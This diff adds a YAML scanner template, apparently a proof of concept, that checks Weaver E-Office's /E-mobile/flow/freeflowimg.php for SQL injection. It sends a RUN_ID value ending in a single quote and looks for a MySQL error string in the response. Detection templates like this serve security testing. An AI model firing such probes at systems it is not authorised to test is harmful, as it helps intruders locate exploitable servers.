@@ -1,0 +1,25 @@
+id: poc-yaml-weaver-e-office-freeflowimg-php-sqli
+info:
+  name: 泛微-EOffice /E-mobile/flow/freeflowimg.php SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  - 两高一弱
+  finger: Endpoint Manager Mobile
+requests:
+- method: GET
+  path: /E-mobile/flow/freeflowimg.php?RUN_ID=1
+  expression: 'status_code == 200 &&
+
+    !contains(body,"mysql_fetch_array()")
+
+    '
+- method: GET
+  path: /E-mobile/flow/freeflowimg.php?RUN_ID=1'
+  expression: 'status_code == 200 &&
+
+    contains(body,"mysql_fetch_array()")
+
+    '
+variables: {}
+transport: http
